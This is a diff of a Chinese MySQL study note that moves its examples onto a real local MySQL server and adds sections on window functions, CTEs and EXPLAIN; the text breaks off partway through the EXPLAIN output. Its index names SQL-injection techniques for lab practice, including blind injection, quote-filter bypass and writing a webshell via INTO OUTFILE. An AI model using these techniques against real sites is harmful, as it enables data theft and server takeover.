@@ -1,24 +1,21 @@
 # MySQL 常用语法速查笔记
 
-> 整理范围：MySQL 建表、增删改查、连接、分组、子查询、索引、事务里**最常用的语法**。
-> 每条都是「解析｜操作｜提醒」三段：**解析**讲这条干什么（参数表 + 返回）、**操作**是可复制的 SQL 语句、
-> **提醒**写要点和易错点。操作里每条 SQL 下面紧跟的运行结果，是把语句真跑一遍得到的真实输出，不是照抄文档写的。
->
-> ⚠️ 先说清楚执行环境：**本机没有装 MySQL**，所以可移植的语句（建表、增删改查、连接、分组、
-> 子查询、事务、索引、视图）是用 Python 自带的 SQLite 真跑的 —— 这些语句在 MySQL 里写法完全一致；
-> 少数 MySQL 独有语法（`AUTO_INCREMENT`、`SHOW`、`DATE_FORMAT`、`TRUNCATE` 等）在结果里标了
-> 「未实跑」，它们照着写没问题，但结果请以你自己的 MySQL 为准。
-> **例外**：C13「SQL 注入必备」用的是一台**真 MySQL**（sqli-labs 靶场容器里的 MySQL 5.5.44），那一节的结果是真实输出。
->
-> 分类按日常使用顺序排：基础语法与类型 → 建表 → 插入 → 查询 → 条件 → 分组 → 连接 → 子查询 → 更新删除 → 函数 → 索引 → 事务视图；
-> 从上面的索引点条目名直接跳转。
->
-> 本文用的示例数据（每条示例都从这份数据重新开始执行，所以各条结果互不影响）：
->
+> 一份**从零基础到进阶**的 MySQL 系统学习笔记：从「怎么连上数据库、第一条 SQL」一路讲到建表、查询、连接、事务、索引，再到窗口函数、执行计划和 SQL 注入原理。
+
+## 怎么用这份文件
+
+- **本机环境**：macOS 上装了 **MySQL 8.4.11**，命令行客户端在 `/opt/homebrew/opt/mysql@8.4/bin/mysql`。连上它：`mysql -u root`（本机 root 无密码）；想看表格线加 `-t`；只想跑一条就退出，用 `-e "SQL"`。
+- **示例数据**：所有示例都在本机的 `learn_sql` 库上**真实执行**，运行结果直接粘贴、未做任何改写。注入那一节（C15）用的是本机另建的 `security` 库（复刻 sqli-labs 靶场数据）。
+- **怎么读每条**：正文每条都是「标题 + **解析**（这条干什么、参数怎么用）+ **操作**（可复制的 SQL）+ **运行结果**（真跑输出）+ 可选 **⚠️ 坑**」。结果里的 `（共 N 行）`/`（影响 N 行）` 都来自实跑。
+- **索引**：下面的速查表按分类列出全部条目，点名字直接跳到对应小节。
+- ⚠️ 带 🔒 的注入类条目仅供理解原理、在**授权靶场**里练习，请勿用于未授权系统。
+
+示例数据结构如下（每条示例都从这份数据重新开始执行，所以各条结果互不影响）：
+
 **students**（6 行）
 
 | id | name | age | gender | score | city |
-|---|---|---|---|---|---|
+|----|------|-----|--------|-------|------|
 | 1 | 张三 | 19 | 男 | 92 | 北京 |
 | 2 | 李四 | 20 | 男 | 78 | 上海 |
 | 3 | 王五 | 19 | 女 | 85 | 北京 |
@@ -29,14 +26,14 @@
 **courses**（2 行）
 
 | id | cname | teacher |
-|---|---|---|
+|----|-------|---------|
 | 1 | 数据库 | 王老师 |
 | 2 | C语言 | 李老师 |
 
 **scores**（6 行）
 
 | student_id | course_id | score |
-|---|---|---|
+|------------|-----------|-------|
 | 1 | 1 | 92 |
 | 1 | 2 | 88 |
 | 2 | 1 | 78 |
@@ -50,6 +47,8 @@
 
 | 分类 | 用法（点击跳转） | 一句话作用 |
 |------|------------------|-----------|
+| C0 环境与连接（新手第一步） | [`连接与查看版本`](#连接与查看版本-连上数据库并确认身份) | 连上数据库并确认身份 |
+| C0 环境与连接（新手第一步） | [`查看服务器变量`](#查看服务器变量-端口引擎数据目录字符集一次看全) | 端口、引擎、数据目录、字符集一次看全 |
 | C1 基础语法与数据类型 | [`第一条 SQL 与注释`](#第一条-sql-与注释-最小可执行的查询两种注释写法) | 最小可执行的查询、两种注释写法 |
 | C1 基础语法与数据类型 | [`常用数据类型`](#常用数据类型-建表时字段该选什么类型) | 建表时字段该选什么类型 |
 | C1 基础语法与数据类型 | [`建库、切库、看库`](#建库切库看库-库是表的容器) | 库是表的容器 |
@@ -93,18 +92,93 @@
 | C12 事务与视图 | [`事务 COMMIT 与 ROLLBACK`](#事务-commit-与-rollback-要么全成功要么全撤销) | 要么全成功、要么全撤销 |
 | C12 事务与视图 | [`CREATE VIEW 视图`](#create-view-视图-把常用查询存成一个虚拟表) | 把常用查询存成一个「虚拟表」 |
 | C12 事务与视图 | [`用户与权限`](#用户与权限-给程序建一个专用账号) | 给程序建一个专用账号 |
-| C13 SQL 注入必备 🔒 | [`UNION SELECT 联合查询`](#union-select-联合查询把两条-select-的结果拼在一起) | 把两条 SELECT 的结果拼在一起 |
-| C13 SQL 注入必备 🔒 | [`information_schema 元数据库`](#information_schema-元数据库拖库第一步查表名列名) | 拖库第一步：查表名、列名 |
-| C13 SQL 注入必备 🔒 | [`database() / user() / version()`](#database--user--version一句话问出当前环境) | 一句话问出当前库 / 账号 / 版本 |
-| C13 SQL 注入必备 🔒 | [`group_concat()`](#group_concat把多行拼成一行一次拖完) | 多行拼成一行，一次拖完 |
-| C13 SQL 注入必备 🔒 | [`三种注释符`](#三种注释符--------截断-sql-后半句) | `#` / `-- ` / `/**/` 截断 SQL 后半句 |
-| C13 SQL 注入必备 🔒 | [`ORDER BY N 判断列数`](#order-by-n判断列数union-前必做) | union 前必做：判断列数 |
-| C13 SQL 注入必备 🔒 | [`SLEEP() 时间盲注`](#sleep时间盲注没回显也能判断真假) | 没回显也能靠时间判断真假 |
-| C13 SQL 注入必备 🔒 | [`SUBSTR() + ASCII()`](#substr--ascii盲注逐字符取数据) | 盲注逐字符取数据 |
-| C13 SQL 注入必备 🔒 | [`LIMIT 与偏移`](#limit-与偏移一条一条拖数据) | 一条一条拖数据 |
-| C13 SQL 注入必备 🔒 | [`LOAD_FILE() / INTO OUTFILE`](#load_file--into-outfile读服务器文件--写-webshell) | 读服务器文件 / 写 webshell |
-| C13 SQL 注入必备 🔒 | [`0x 十六进制字符串`](#0x-十六进制字符串绕过引号过滤) | 绕过引号过滤 |
-| C13 SQL 注入必备 🔒 | [`堆叠查询（分号）`](#堆叠查询分号一次执行多条语句) | 一次执行多条语句 |
+| C13 窗口函数与 CTE（进阶） | [`窗口函数 ROW_NUMBER 与 RANK`](#窗口函数-row_number-与-rank-不折叠行也能排名) | 不折叠行也能排名 |
+| C13 窗口函数与 CTE（进阶） | [`窗口函数 SUM() OVER`](#窗口函数-sum-over-组内累计与占比) | 组内累计与占比 |
+| C13 窗口函数与 CTE（进阶） | [`CTE WITH 拆解复杂查询`](#cte-with-拆解复杂查询-把中间结果命名成临时表) | 把中间结果命名成临时表 |
+| C14 执行计划与性能优化（进阶） | [`EXPLAIN 看执行计划`](#explain-看执行计划-语句到底走没走索引) | 语句到底走没走索引 |
+| C14 执行计划与性能优化（进阶） | [`EXPLAIN ANALYZE`](#explain-analyze-看实际耗时) | 看实际耗时 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`UNION SELECT 联合查询`](#union-select-联合查询-把两条-select-的结果拼在一起) | 把两条 SELECT 的结果拼在一起 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`information_schema 元数据库`](#information_schema-元数据库-拖库第一步查表名列名) | 拖库第一步：查表名、列名 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`database()/user()/version()`](#databaseuserversion-一句话问出当前库账号版本) | 一句话问出当前库、账号、版本 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`group_concat()`](#group_concat-把多行拼成一行一次拖完) | 把多行拼成一行，一次拖完 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`三种注释符`](#三种注释符-用三种注释截断-sql-后半句) | 用三种注释截断 SQL 后半句 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`ORDER BY N`](#order-by-n-判断列数union-前必做) | 判断列数（union 前必做） |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`SLEEP()`](#sleep-时间盲注没回显也能判断真假) | 时间盲注，没回显也能判断真假 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`SUBSTR()+ASCII()`](#substrascii-盲注逐字符取数据) | 盲注逐字符取数据 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`LIMIT 与偏移`](#limit-与偏移-一条一条拖数据) | 一条一条拖数据 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`LOAD_FILE()/INTO OUTFILE`](#load_fileinto-outfile-读服务器文件写-webshell) | 读服务器文件、写 webshell |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`0x 十六进制字符串`](#0x-十六进制字符串-绕过引号过滤) | 绕过引号过滤 |
+| C15 SQL 注入必备（打靶场 / 理解注入用） | [`堆叠查询（分号）`](#堆叠查询分号-一次执行多条语句) | 一次执行多条语句 |
+
+---
+
+## C0 环境与连接（新手第一步）
+
+### `连接与查看版本` 连上数据库并确认身份
+
+**解析**　本机装的是 MySQL 8.4.11，命令行客户端在 `/opt/homebrew/opt/mysql@8.4/bin/mysql`，用 `mysql -u root` 就能连上（本机 root 没设密码）。连上后第一件事是确认版本（决定能用哪些语法）和当前身份。
+
+| 命令行参数 | 作用 |
+|------------|------|
+| `-u root` | 用 root 账号登录（本机无密码） |
+| `-p` | 需要密码时加，回车后再输入 |
+| `库名` | 选填，直接连到某个库 |
+| `-e "SQL"` | 选填，不进入交互界面，执行一条 SQL 就退出 |
+| `-t` | 选填，结果带表格线 |
+
+返回：查询结果表
+
+**操作**
+
+```sql
+SELECT VERSION()     AS 版本,
+       CURRENT_USER() AS 账号,
+       DATABASE()    AS 当前库;
+```
+```text
+版本 | 账号 | 当前库
+8.4.11 | root@localhost | learn_sql
+（共 1 行）
+```
+
+### `查看服务器变量` 端口、引擎、数据目录、字符集一次看全
+
+**解析**　`SHOW VARIABLES LIKE '...'` 查服务器配置项：端口、默认存储引擎、数据目录、字符集。换机器/排查问题先看这些。
+
+| 变量 | 含义 |
+|------|------|
+| `port` | 监听端口（默认 3306） |
+| `default_storage_engine` | 默认引擎（8.0 起是 InnoDB，支持事务） |
+| `datadir` | 数据文件目录 |
+| `character_set_server` | 服务端字符集 |
+
+返回：一张两列的结果表（变量名 / 值）
+
+**操作**
+
+```sql
+SHOW VARIABLES LIKE 'port';
+SHOW VARIABLES LIKE 'default_storage_engine';
+SHOW VARIABLES LIKE 'datadir';
+SHOW VARIABLES LIKE 'character_set_server';
+```
+```text
+Variable_name | Value
+port | 3306
+（共 1 行）
+
+Variable_name | Value
+default_storage_engine | InnoDB
+（共 1 行）
+
+Variable_name | Value
+datadir | /opt/homebrew/var/mysql/
+（共 1 行）
+
+Variable_name | Value
+character_set_server | utf8mb4
+（共 1 行）
+```
 
 ---
 
@@ -185,17 +259,42 @@ CREATE TABLE demo_types (
 **操作**
 
 ```sql
-CREATE DATABASE school DEFAULT CHARSET utf8mb4;   -- 建库，推荐 utf8mb4（能存 emoji）
-USE school;                                       -- 切到 / 进入这个库
-SHOW DATABASES;                                   -- 列出所有库
-SELECT DATABASE();                                -- 看现在在哪个库
-SHOW TABLES;                                      -- 看当前库有哪些表
+CREATE DATABASE IF NOT EXISTS school DEFAULT CHARSET utf8mb4;   -- 建库，推荐 utf8mb4（能存 emoji）
+SHOW DATABASES;                                                -- 列出所有库
+USE school;                                                    -- 切到 / 进入这个库
+SELECT DATABASE() AS 当前库;                                    -- 看现在在哪个库
+SHOW TABLES;                                                   -- 看当前库有哪些表
+DROP DATABASE school;                                          -- 用完删掉
 ```
 ```text
-（MySQL 专有语法，本机没有装 MySQL，这条未实跑 —— 以官方文档为准）
+（语句已执行）
+
+Database
+information_schema
+learn_sql
+mysql
+performance_schema
+php_demo
+school
+security
+sys
+（共 8 行）
+
+（语句已执行）
+
+当前库
+school
+（共 1 行）
+
+Tables_in_school
+（共 0 行）
+
+（语句已执行）
 ```
 
-> ⚠️ MySQL 里表都属于某个库，一条语句只能操作当前库里的表，除非写全名 `库名.表名`；这几条是 MySQL 服务端/客户端专有命令，本机没装 MySQL 所以**未实跑**；`DROP DATABASE 库名;` 会连库带表全删，慎用。
+> ⚠️ MySQL 里表都属于某个库，一条语句只能操作当前库里的表（除非写全名 `库名.表名`）；上面就是在一台真 MySQL 8.4.11 上跑出来的，`SHOW DATABASES` 会列出本机所有库；`DROP DATABASE` 连同库里所有表一起删，慎用。
+
+---
 
 ## C2 建表与修改表
 
@@ -265,10 +364,21 @@ SELECT * FROM students2;
 SELECT LAST_INSERT_ID();                     -- 刚插入那行的自增 id
 ```
 ```text
-（MySQL 专有语法，本机没有装 MySQL，这条未实跑 —— 以官方文档为准）
+（语句已执行）
+
+（影响 2 行）
+
+id | name
+1 | 张三
+2 | 李四
+（共 2 行）
+
+LAST_INSERT_ID()
+1
+（共 1 行）
 ```
 
-> ⚠️ `AUTO_INCREMENT`、`ENGINE=InnoDB`、`LAST_INSERT_ID()` 都是 MySQL 专有语法，本机没装 MySQL 所以**未实跑**；插入时不给 id 值，数据库自动填 1、2、3…；删掉的行不会把号让出来。
+> ⚠️ 插入时不给 id 值，数据库自动填 1、2、3…；删掉的行不会把号让出来（`AUTO_INCREMENT` 计数器只增不减）。`LAST_INSERT_ID()` 拿到的是本次连接最近一次插入的自增 id。
 
 ### `ALTER TABLE 加列、改名、删列` 表建好之后改结构
 
@@ -304,7 +414,7 @@ id | name | hometown
 （共 3 行）
 ```
 
-> ⚠️ 加 `NOT NULL` 列时要给默认值，否则老数据没法填；MySQL 里改**类型**用 `ALTER TABLE ... MODIFY COLUMN age TINYINT;`（TINYINT 只占 1 字节），加索引用 `ADD INDEX`——这两种写法和 SQLite 不同，本机未实跑。
+> ⚠️ 加 `NOT NULL` 列时要给默认值，否则老数据没法填；MySQL 里改**类型**用 `ALTER TABLE 表名 MODIFY COLUMN 列 新类型;`，加索引用 `ALTER TABLE 表名 ADD INDEX 索引名(列);`。改结构可能锁表，大表上要挑低峰期做。
 
 ### `外键 FOREIGN KEY` 让两张表的数据对得上
 
@@ -374,6 +484,8 @@ DROP TABLE tmp;
 ```
 
 > ⚠️ `DROP TABLE` 是**结构+数据**全删，不可恢复；只清数据、保留表结构要用 `TRUNCATE TABLE 表名;`（MySQL 专有，见 C9 更新与删除）。
+
+---
 
 ## C3 插入数据
 
@@ -449,7 +561,7 @@ id | name | score
 
 | 参数 | 默认值 | 作用 |
 |------|--------|------|
-| START TRANSACTION | 必填 | 开启事务（SQLite 里写法是 BEGIN） |
+| START TRANSACTION | 必填 | 开启事务 |
 | COMMIT | 必填 | 确认提交：改动才真正生效 |
 | ROLLBACK | 出错时用 | 回滚：本次事务的改动全部作废 |
 
@@ -458,7 +570,7 @@ id | name | score
 **操作**
 
 ```sql
-START TRANSACTION;                                  -- MySQL 的写法（SQLite 里是 BEGIN）
+START TRANSACTION;                                  -- 开启事务
 INSERT INTO students (id, name) VALUES (11, '甲同学');
 INSERT INTO students (id, name) VALUES (12, '乙同学');
 COMMIT;                                             -- 确认提交
@@ -478,7 +590,9 @@ SELECT COUNT(*) AS 学生总数 FROM students;
 （共 1 行）
 ```
 
-> ⚠️ 忘记 `COMMIT` 时连接一断就会回滚；`DROP TABLE`/`CREATE TABLE` 这类 DDL 在 MySQL 里会**隐式提交**，没法回滚。
+> ⚠️ 忘记 `COMMIT` 时连接一断就会自动回滚；`DROP TABLE`/`CREATE TABLE` 这类 DDL 在 MySQL 里会**隐式提交**，没法回滚。InnoDB 引擎才支持事务（8.0 起默认就是 InnoDB）。
+
+---
 
 ## C4 查询基础
 
@@ -518,9 +632,9 @@ name | score
 name | 折后分
 张三 | 55.2
 李四 | 46.8
-王五 | 51
-赵六 | 36
-钱七 | 57
+王五 | 51.0
+赵六 | 36.0
+钱七 | 57.0
 （共 5 行）
 ```
 
@@ -625,6 +739,8 @@ name | score
 ```
 
 > ⚠️ MySQL 也支持简写 `LIMIT 2, 3`（跳过 2 条、取 3 条），但 `LIMIT 3 OFFSET 2` 更清楚；排序不写时顺序不保证，分页一定要配 `ORDER BY`。
+
+---
 
 ## C5 条件与运算符
 
@@ -773,6 +889,8 @@ name | age
 
 > ⚠️ 聚合函数（SUM/AVG/MAX/MIN）会自动**跳过 NULL**：`AVG(score)` 算的是「有成绩的人」的平均分。
 
+---
+
 ## C6 聚合函数与分组
 
 ### `五个常用聚合函数` 数数、求和、平均、最大最小
@@ -802,7 +920,7 @@ FROM students;
 ```
 ```text
 总人数 | 有成绩人数 | 总分 | 平均分 | 最高分 | 最低分
-6 | 5 | 410 | 82 | 95 | 60
+6 | 5 | 410 | 82.00 | 95 | 60
 （共 1 行）
 ```
 
@@ -830,7 +948,7 @@ ORDER BY 人数 DESC;
 city | 人数 | 平均分
 北京 | 2 | 88.5
 上海 | 2 | 86.5
-广州 | 1 | 60
+广州 | 1 | 60.0
 NULL | 1 | NULL
 （共 4 行）
 ```
@@ -893,6 +1011,8 @@ NULL | 男 | 1
 ```
 
 > ⚠️ 组合的先后顺序影响结果顺序，用 `ORDER BY` 明确排一下更稳。
+
+---
 
 ## C7 多表连接
 
@@ -965,8 +1085,8 @@ GROUP BY c.cname;
 （共 7 行）
 
 课程 | 选课人数
-C语言 | 2
 数据库 | 4
+C语言 | 2
 （共 2 行）
 ```
 
@@ -995,8 +1115,8 @@ SELECT name FROM students WHERE city = '北京';
 ```text
 name
 张三
-王五
 钱七
+王五
 （共 3 行）
 
 name
@@ -1008,6 +1128,8 @@ name
 ```
 
 > ⚠️ 列的个数和类型要一致；注意两个结果的行数不同：`UNION` 把重名的合并了，`UNION ALL` 一条不落。
+
+---
 
 ## C8 子查询与条件逻辑
 
@@ -1153,6 +1275,8 @@ name | 分数 | 城市 | 有值优先
 （共 6 行）
 ```
 
+---
+
 ## C9 更新与删除
 
 ### `UPDATE 更新数据` 改已有数据的值
@@ -1239,10 +1363,18 @@ SELECT COUNT(*) AS 剩下人数 FROM students;
 TRUNCATE TABLE students;           -- MySQL 专有：整体清空，更快
 ```
 ```text
-（MySQL 专有语法，本机没有装 MySQL，这条未实跑 —— 以官方文档为准）
+（影响 6 行）
+
+剩下人数
+0
+（共 1 行）
+
+（语句已执行）
 ```
 
-> ⚠️ `TRUNCATE` 是 MySQL 专有语法（本机未实跑）；它属于 DDL，一执行就会**隐式提交**，所以别指望 `ROLLBACK` 救回来。
+> ⚠️ `TRUNCATE` 属 DDL，一执行就**隐式提交**，别指望 `ROLLBACK` 救回来；它还会把自增 id 归零。要能回滚就用 `DELETE`。
+
+---
 
 ## C10 常用函数（字符串 / 数字 / 类型转换）
 
@@ -1298,18 +1430,40 @@ LIMIT 2;
 **操作**
 
 ```sql
-SELECT NOW()                       AS 现在几点;
-SELECT CURDATE()                   AS 今天;
+SELECT NOW()       AS 现在几点;      -- 当前日期时间
+SELECT CURDATE()   AS 今天;          -- 当前日期
 SELECT DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%s') AS 格式化;
-SELECT DATE_FORMAT(born, '%Y年%m月') AS 出生年月 FROM students WHERE id = 1;
+SELECT DATE_FORMAT(CURDATE(), '%Y年%m月%d日') AS 今天中文;
 SELECT DATEDIFF('2026-12-31', CURDATE()) AS 距年底还有几天;
 SELECT YEAR(NOW()) AS 年, MONTH(NOW()) AS 月, DAY(NOW()) AS 日;
 ```
 ```text
-（MySQL 专有语法，本机没有装 MySQL，这条未实跑 —— 以官方文档为准）
+现在几点
+2026-10-08 21:28:16
+（共 1 行）
+
+今天
+2026-10-08
+（共 1 行）
+
+格式化
+2026-10-08 21:28:16
+（共 1 行）
+
+今天中文
+2026年10月08日
+（共 1 行）
+
+距年底还有几天
+84
+（共 1 行）
+
+年 | 月 | 日
+2026 | 10 | 8
+（共 1 行）
 ```
 
-> ⚠️ 这些都是 MySQL 专有函数（本机没装 MySQL 所以**未实跑**）；注意 MySQL 的日期格式符是 `%i` 表示分钟（不是 `%M`），和别的语言不一样。
+> ⚠️ 注意 MySQL 的日期格式符：**`%i` 是分钟**（不是 `%M`，`%M` 是月份名），`%m` 才是月份数字，和别的语言不一样；`NOW()` 是本次示例运行时的真实时间。
 
 ### `数学函数` 四舍五入、取整、绝对值、余数
 
@@ -1361,11 +1515,13 @@ SELECT CAST('123' AS SIGNED) + 1     AS 字符串转数字,
 ```
 ```text
 字符串转数字 | 截断成整数 | 整数转字符串 | 拼起来
-124 | 3.9 | 88 | 编号-7
+124 | 3 | 88 | 编号-7
 （共 1 行）
 ```
 
 > ⚠️ 转换失败会得到 0 或警告，不会报错；把字符串当数字用时 SQL 会自动转换，但显式 `CAST` 更清楚（也避免索引失效）。
+
+---
 
 ## C11 索引
 
@@ -1432,7 +1588,7 @@ name | city
 （共 2 行）
 ```
 
-> ⚠️ 想知道语句到底走没走索引，在 MySQL 里语句前面加 `EXPLAIN`（`EXPLAIN SELECT ...`）看 `key` 列——这条本机未实跑。
+> ⚠️ 想知道语句到底走没走索引，在语句前加 `EXPLAIN`（见 C14）。复合索引 `(city, gender)`：`WHERE city=?` 和 `WHERE city=? AND gender=?` 都能用上，单独 `WHERE gender=?` 用不上——这就是「最左前缀」。
 
 ### `查看表结构、索引、建表语句` 接手一个库先看有什么
 
@@ -1458,10 +1614,75 @@ SHOW CREATE TABLE students\G          -- 建表语句原文（\G 是竖排显示
 DROP INDEX idx_students_city ON students;   -- 删索引
 ```
 ```text
-（MySQL 专有语法，本机没有装 MySQL，这条未实跑 —— 以官方文档为准）
+Tables_in_learn_sql
+courses
+scores
+students
+（共 3 行）
+
+Field | Type | Null | Key | Default | Extra
+id | int | NO | PRI | NULL | 
+name | varchar(20) | YES |  | NULL | 
+age | int | YES |  | NULL | 
+gender | char(2) | YES |  | NULL | 
+score | int | YES |  | NULL | 
+city | varchar(20) | YES | MUL | NULL | 
+（共 6 行）
+
+Table: students
+Non_unique: 0
+Key_name: PRIMARY
+Seq_in_index: 1
+Column_name: id
+Collation: A
+Cardinality: 6
+Sub_part: NULL
+Packed: NULL
+Null: 
+Index_type: BTREE
+Comment: 
+Index_comment: 
+Visible: YES
+Expression: NULL
+
+Table: students
+Non_unique: 1
+Key_name: idx_students_city
+Seq_in_index: 1
+Column_name: city
+Collation: A
+Cardinality: 4
+Sub_part: NULL
+Packed: NULL
+Null: YES
+Index_type: BTREE
+Comment: 
+Index_comment: 
+Visible: YES
+Expression: NULL
+
+（共 2 行）
+
+Table: students
+Create Table: CREATE TABLE `students` (
+  `id` int NOT NULL,
+  `name` varchar(20) DEFAULT NULL,
+  `age` int DEFAULT NULL,
+  `gender` char(2) DEFAULT NULL,
+  `score` int DEFAULT NULL,
+  `city` varchar(20) DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `idx_students_city` (`city`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci
+
+（共 1 行）
+
+（语句已执行）
 ```
 
-> ⚠️ 这些 `SHOW`/`DESCRIBE` 是 MySQL 客户端专有命令，本机没装 MySQL 所以**未实跑**。
+> ⚠️ `SHOW CREATE TABLE ...\G` 里的 `\G` 是客户端竖排显示开关（不是 SQL 语法）；`DESC 表名` 是 `DESCRIBE 表名` 的简写。接手陌生库时这几条是排查第一步。
+
+---
 
 ## C12 事务与视图
 
@@ -1540,7 +1761,7 @@ id | name | score
 
 > ⚠️ 视图里的数据是**实时算的**（底层表一变，视图结果就变）；改视图用 `CREATE OR REPLACE VIEW ...`，删视图用 `DROP VIEW 名字;`。
 
-### `用户与权限` 给程序建一个专用账号
+### `用户与权限` 给程序建一个专用账号🔒
 
 **解析**　给程序建一个专用账号，按最小权限原则只给需要的权限，不要用 root。
 
@@ -1555,28 +1776,226 @@ id | name | score
 **操作**
 
 ```sql
-CREATE USER 'app'@'localhost' IDENTIFIED BY '强密码';
-GRANT SELECT, INSERT, UPDATE ON school.* TO 'app'@'localhost';
-FLUSH PRIVILEGES;
-SHOW GRANTS FOR 'app'@'localhost';
+CREATE USER 'app'@'localhost' IDENTIFIED BY 'StrongPass_2026';   -- 建账号、设密码
+GRANT SELECT, INSERT, UPDATE ON learn_sql.* TO 'app'@'localhost';   -- 按需授权（最小权限）
+FLUSH PRIVILEGES;                                                    -- 让权限改动生效
+SHOW GRANTS FOR 'app'@'localhost';                                   -- 看它有哪些权限
+DROP USER 'app'@'localhost';                                         -- 演示完删掉
 ```
 ```text
-（MySQL 专有语法，本机没有装 MySQL，这条未实跑 —— 以官方文档为准）
+（语句已执行）
+
+（语句已执行）
+
+（语句已执行）
+
+Grants for app@localhost
+GRANT USAGE ON *.* TO `app`@`localhost`
+GRANT SELECT, INSERT, UPDATE ON `learn_sql`.* TO `app`@`localhost`
+（共 2 行）
+
+（语句已执行）
 ```
 
-> ⚠️ 这些是 MySQL 专有的账号管理语句，本机没装 MySQL 所以**未实跑**；`'app'@'localhost'` 表示只允许本机登录。
+> ⚠️ 按最小权限原则，给程序建专用账号、只授它需要的权限，别直接用 root；`'app'@'localhost'` 表示只允许本机登录（`%` 才是任意主机）。权限改动后要 `FLUSH PRIVILEGES`。
 
 ---
 
-## C13 SQL 注入必备（打靶场 / 理解注入用）
+## C13 窗口函数与 CTE（进阶）
 
-> 这一节角度和前面不同：C1~C12 教「怎么写 SQL 干活」，这一节讲「**注入时怎么用 SQL 读别人的数据**」。
-> 示例在 **sqli-labs 靶场容器里的真 MySQL（5.5.44）** 上跑过，结果是真实输出（库用它自带的 `security`）。
-> 「解析」开头带 🔒 的，就是 Web 安全（SQL 注入）直接相关的条目。
+### `窗口函数 ROW_NUMBER 与 RANK` 不折叠行也能排名
 
-### `UNION SELECT` 联合查询：把两条 SELECT 的结果拼在一起
+**解析**　普通 `GROUP BY` 会把多行压成一行；窗口函数 `... OVER (...)` 则在**保留每一行**的同时算「组内排名、累计、占比」。`ROW_NUMBER()` 从 1 连续编号，`RANK()` 遇到并列同号且后面跳号。
 
-**解析**　🔒 `UNION` 把上下两条 `SELECT` 的结果竖着合并（**列数必须相同**）。注入里用它把"你想查的东西"接到目标原来的查询后面，从而读到别的表。
+| 函数 | 作用 |
+|------|------|
+| `ROW_NUMBER() OVER (ORDER BY 列)` | 连续编号，绝不相同 |
+| `RANK() OVER (ORDER BY 列)` | 并列同名，之后跳号（1,1,3…） |
+| `DENSE_RANK()` | 并列同名，之后不跳号（1,1,2…） |
+
+返回：原表每一行 + 新增一列排名
+
+**操作**
+
+```sql
+SELECT name, score,
+       ROW_NUMBER() OVER (ORDER BY score DESC) AS 序号,
+       RANK()       OVER (ORDER BY score DESC) AS 排名
+FROM students
+WHERE score IS NOT NULL;
+```
+```text
+name | score | 序号 | 排名
+钱七 | 95 | 1 | 1
+张三 | 92 | 2 | 2
+王五 | 85 | 3 | 3
+李四 | 78 | 4 | 4
+赵六 | 60 | 5 | 5
+（共 5 行）
+```
+
+### `窗口函数 SUM() OVER` 组内累计与占比
+
+**解析**　`OVER (PARTITION BY 列)` 先按列分组，再在组内算聚合，但**不合并行**——所以能算出「每行占本组总和的百分比」这类普通聚合做不到的东西。
+
+| 写法 | 作用 |
+|------|------|
+| `SUM(x) OVER (PARTITION BY g)` | 每组的总和，重复在组内每一行 |
+| `SUM(x) OVER (ORDER BY y)` | 按 y 顺序的累计和（跑动合计） |
+
+返回：原表每一行 + 组内汇总列
+
+**操作**
+
+```sql
+SELECT name, city, score,
+       SUM(score) OVER (PARTITION BY city) AS 城市总分,
+       ROUND(score / SUM(score) OVER (PARTITION BY city) * 100, 1) AS 组内占比
+FROM students
+WHERE score IS NOT NULL
+ORDER BY city, score DESC;
+```
+```text
+name | city | score | 城市总分 | 组内占比
+钱七 | 上海 | 95 | 173 | 54.9
+李四 | 上海 | 78 | 173 | 45.1
+张三 | 北京 | 92 | 177 | 52.0
+王五 | 北京 | 85 | 177 | 48.0
+赵六 | 广州 | 60 | 60 | 100.0
+（共 5 行）
+```
+
+### `CTE WITH 拆解复杂查询` 把中间结果命名成临时表
+
+**解析**　`WITH 名字 AS (子查询)` 把一段查询命名成临时的「公共表表达式」（CTE），后面就能像表一样用它。比嵌套子查询好读，也方便逐步调试；MySQL 8.0 起支持。
+
+| 写法 | 作用 |
+|------|------|
+| `WITH x AS (...)` | 定义一个临时结果集 x |
+| `, y AS (...)` | 可以接着定义多个 |
+| `SELECT ... FROM x` | 最后用它 |
+
+返回：外层查询的结果表
+
+**操作**
+
+```sql
+WITH 城市统计 AS (
+    SELECT city, COUNT(*) AS 人数, ROUND(AVG(score), 1) AS 平均分
+    FROM students
+    GROUP BY city
+)
+SELECT * FROM 城市统计
+WHERE 人数 >= 2
+ORDER BY 平均分 DESC;
+```
+```text
+city | 人数 | 平均分
+北京 | 2 | 88.5
+上海 | 2 | 86.5
+（共 2 行）
+```
+
+---
+
+## C14 执行计划与性能优化（进阶）
+
+### `EXPLAIN 看执行计划` 语句到底走没走索引
+
+**解析**　在语句前加 `EXPLAIN`，MySQL 不执行它，而是告诉你「打算怎么执行」。重点看三列：`type`（`ALL`=全表扫描、`ref`/`range` 等表示用上了索引）、`key`（真正用到的索引）、`rows`（预估要扫多少行）。
+
+| 关键列 | 看什么 |
+|--------|--------|
+| `type` | 访问类型，`ALL` 最差（全表扫），`ref`/`eq_ref`/`range` 较好 |
+| `key` | 实际用到的索引名，`NULL` 表示没用索引 |
+| `rows` | 预估扫描行数，越小越好 |
+| `Extra` | 附加信息，如 `Using where`、`Using index` |
+
+返回：一张描述执行计划的结果表
+
+**操作**
+
+```sql
+EXPLAIN SELECT name FROM students WHERE city = '北京';
+
+CREATE INDEX idx_students_city ON students (city);   -- 先给 city 建个索引
+
+EXPLAIN SELECT name FROM students WHERE city = '北京';
+
+DROP INDEX idx_students_city ON students;            -- 用完删掉
+```
+```text
+id: 1
+select_type: SIMPLE
+table: students
+partitions: NULL
+type: ALL
+possible_keys: NULL
+key: NULL
+key_len: NULL
+ref: NULL
+rows: 6
+filtered: 16.67
+Extra: Using where
+
